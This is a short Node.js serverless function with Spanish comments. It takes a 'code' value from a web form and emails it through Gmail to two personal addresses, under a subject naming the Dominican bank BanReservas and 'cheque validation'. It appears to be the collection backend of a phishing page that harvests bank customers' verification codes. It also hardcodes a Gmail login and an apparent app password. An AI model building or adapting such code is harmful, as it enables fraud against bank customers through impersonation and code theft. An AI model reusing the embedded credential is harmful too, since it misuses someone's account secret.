const nodemailer = require('nodemailer');
require('dotenv').config();

exports.handler = async function(event, context) {
    // Verificar si el método es POST
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Método no permitido' }),
        };
    }

    try {
        // Extraer el campo 'code' del cuerpo de la solicitud
        const { code } = JSON.parse(event.body);

        // Configuración del transportador de Nodemailer
        let transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: 'cuentaluperonp5@gmail.com',
                pass: 'ogynqksiltkdnuoz', // Asegúrate de usar una contraseña de aplicación
            },
        });

        // Configuración del correo
        let mailOptions = {
            from: 'cuentaluperonp5@gmail.com',
            to: 'sierroalee@gmail.com, almabrito67@gmail.com',
            subject: 'Validación de cheque - BanReservas',
            text: `El usuario ingresó el siguiente código de validación:\n\nCódigo: ${code}`,
        };

        // Enviar el correo
        await transporter.sendMail(mailOptions);

        return {
            statusCode: 200,
            body: JSON.stringify({ message: 'Correo enviado con éxito' }),
        };
    } catch (error) {
        console.error('Error al enviar el correo:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Error al enviar el correo' }),
        };
    }
};
